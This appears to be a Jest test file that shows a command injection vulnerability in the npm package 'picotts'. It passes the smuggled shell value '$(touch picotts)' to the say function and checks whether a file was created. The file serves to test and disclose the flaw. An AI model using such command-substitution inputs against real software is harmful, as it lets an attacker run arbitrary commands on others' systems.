//callback shoul be function error
test("Command Injection in picotts", () => {
  const picotts = require("picotts");
  const fs = require("fs");
  const path = "./picotts";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  picotts.say("$(touch picotts)", "english", function (err) {
    if (!err) console.log("Correctly played");
  });
  sleep.sleep(5);

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, () => {});
});
